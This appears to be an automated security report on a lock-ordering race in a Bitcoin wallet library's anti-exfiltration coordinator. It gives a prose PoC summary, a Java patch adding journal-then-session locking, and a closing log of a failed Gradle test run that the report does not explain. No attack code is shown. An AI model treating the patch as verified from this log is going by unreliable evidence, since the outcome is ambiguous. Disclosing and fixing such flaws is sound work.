PoC executed successfully with the unit harness (`JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`). It uses only real public/package-native coordinator APIs for create, acceptOpenings, recordPostRevealAbort, load, and status checks; an auxiliary JVM holds the real sidecar session file lock only to deterministically widen the natural race window. The test proves the durable end state: the shared journal contains the newly recorded post-reveal abort, the concurrently created fresh session exists despite passing `acknowledgePostRevealAbortRisk=false`, that fresh session reports the abort count after reload, and it can still accept openings and return a HOST_REVEAL message after the abort. Timing influence is modeled locally via concurrent threads/processes rather than by an external hardware signer or wallet UI integration.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Serializes fresh-session abort-history validation and session creation under the journal lock, and makes abort recording acquire the same journal lock first with consistent journal→session lock ordering. Unlocked journal helpers avoid recursive file locking while preserving existing public behavior.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
@@ -1,138 +1,144 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.time.Instant;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
 public final class AntiExfilAbortJournal {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'J'};
     private static final int VERSION = 1;
     private static final int MAX_FILE_BYTES = 4 * 1024 * 1024;
     private static final int MAX_EVENTS = 10_000;
     private static final int MAX_REASON_BYTES = 512;
 
     private final Path path;
     private final byte[] walletIdentity;
 
     public AntiExfilAbortJournal(Path path, byte[] walletIdentity) {
         if(path == null || walletIdentity == null || walletIdentity.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort-journal identity");
         }
         this.path = path;
         this.walletIdentity = walletIdentity.clone();
     }
 
     public List<AbortEvent> getEvents() {
-        return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
+        return AntiExfilDurableFiles.locked(path, this::getEventsUnlocked);
     }
 
+    List<AbortEvent> getEventsUnlocked() throws IOException {
+        return List.copyOf(loadOrCreate().events);
+    }
+
     AbortEvent append(byte[] sessionId, byte[] psbtDigest, String reason) {
+        return AntiExfilDurableFiles.locked(path, () -> appendUnlocked(sessionId, psbtDigest, reason));
+    }
+
+    AbortEvent appendUnlocked(byte[] sessionId, byte[] psbtDigest, String reason) throws IOException {
         if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort event context");
         }
         byte[] reasonBytes = reason == null ? new byte[0] : reason.strip().getBytes(StandardCharsets.UTF_8);
         if(reasonBytes.length == 0 || reasonBytes.length > MAX_REASON_BYTES) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                     "Abort reason must contain 1 to " + MAX_REASON_BYTES + " UTF-8 bytes");
         }
-        return AntiExfilDurableFiles.locked(path, () -> {
-            Journal journal = loadOrCreate();
-            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
-            AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
-                    new String(reasonBytes, StandardCharsets.UTF_8));
-            List<AbortEvent> updated = new ArrayList<>(journal.events);
-            updated.add(event);
-            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
-            return event;
-        });
+        Journal journal = loadOrCreate();
+        if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
+        AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
+                new String(reasonBytes, StandardCharsets.UTF_8));
+        List<AbortEvent> updated = new ArrayList<>(journal.events);
+        updated.add(event);
+        AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
+        return event;
     }
 
     private Journal loadOrCreate() throws IOException {
         if(!Files.exists(path)) {
             Journal journal = new Journal(walletIdentity, List.of());
             AntiExfilDurableFiles.write(path, encode(journal), true);
             return journal;
         }
         Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
         if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
         return journal;
     }
 
     private static byte[] encode(Journal journal) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.write(journal.walletIdentity);
             output.writeInt(journal.events.size());
             for(AbortEvent event : journal.events) {
                 byte[] reason = event.reason.getBytes(StandardCharsets.UTF_8);
                 output.write(event.sessionId);
                 output.write(event.psbtDigest);
                 output.writeLong(event.recordedAtEpochSecond);
                 output.writeShort(reason.length);
                 output.write(reason);
             }
         }
         return bytes.toByteArray();
     }
 
     private static Journal decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             byte[] magic = input.readNBytes(4);
             if(!Arrays.equals(magic, MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown abort-journal format");
             byte[] identity = input.readNBytes(32);
             int count = input.readInt();
             if(identity.length != 32 || count < 0 || count > MAX_EVENTS) throw new IOException("Invalid abort-journal header");
             List<AbortEvent> events = new ArrayList<>(count);
             for(int i = 0; i < count; i++) {
                 byte[] sessionId = input.readNBytes(32);
                 byte[] digest = input.readNBytes(32);
                 long timestamp = input.readLong();
                 int reasonLength = input.readUnsignedShort();
                 byte[] reason = input.readNBytes(reasonLength);
                 if(sessionId.length != 32 || digest.length != 32 || reasonLength < 1
                         || reasonLength > MAX_REASON_BYTES || reason.length != reasonLength || timestamp < 0) {
                     throw new IOException("Invalid abort-journal event");
                 }
                 events.add(new AbortEvent(sessionId, digest, timestamp, new String(reason, StandardCharsets.UTF_8)));
             }
             if(input.available() != 0) throw new IOException("Trailing abort-journal data");
             return new Journal(identity, events);
         } catch(EOFException e) {
             throw new IOException("Truncated abort journal", e);
         }
     }
 
     public static final class AbortEvent {
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final long recordedAtEpochSecond;
         private final String reason;
 
         private AbortEvent(byte[] sessionId, byte[] psbtDigest, long recordedAtEpochSecond, String reason) {
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.recordedAtEpochSecond = recordedAtEpochSecond;
             this.reason = reason;
         }
 
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public long getRecordedAtEpochSecond() { return recordedAtEpochSecond; }
         public String getReason() { return reason; }
     }
 
     private record Journal(byte[] walletIdentity, List<AbortEvent> events) {
     }
 }

diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,454 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
     private static final int VERSION = 1;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
         State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                 AntiExfilCodec.encode(commit), null, null, null, null, rhos);
-        List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
-        if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
-            throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
-        }
-        AntiExfilDurableFiles.locked(sessionPath, () -> {
-            AntiExfilDurableFiles.write(sessionPath, encode(state), true);
+        AntiExfilAbortJournal journal = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity);
+        AntiExfilDurableFiles.locked(journalPath, () -> {
+            List<AntiExfilAbortJournal.AbortEvent> aborts = journal.getEventsUnlocked();
+            if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
+                throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
+            }
+            AntiExfilDurableFiles.locked(sessionPath, () -> {
+                AntiExfilDurableFiles.write(sessionPath, encode(state), true);
+                return null;
+            });
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                 byte[] rho = state.rhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
             State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                     state.message1, encodedOpenings, message3, null, null, state.rhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
             return message3.clone();
         });
     }
 
     public Completion complete(byte[] encodedSignatures) {
         if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
             AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
             AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
             if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
             AntiExfilCodec.validateTransition(reveal, signatures);
             byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                     AntiExfilCodec.decode(state.message1), signatures, state.rhos);
             State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                     state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                 commit, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
             verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
-        return AntiExfilDurableFiles.locked(sessionPath, () -> {
+        AntiExfilAbortJournal journal = new AntiExfilAbortJournal(journalPath, walletIdentity);
+        return AntiExfilDurableFiles.locked(journalPath, () -> AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
             if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
-            return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
-                    commit.getSessionId(), commit.getPsbtDigest(), reason.name());
-        });
+            return journal.appendUnlocked(commit.getSessionId(), commit.getPsbtDigest(), reason.name());
+        }));
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                 commit.getNetwork(), commit.getSessionId(), state.rhos);
         if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
         if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
         byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
         return bytes.toByteArray();
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
             if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
             return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
                          byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 37 lines & 1.1728515625 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 2s
```
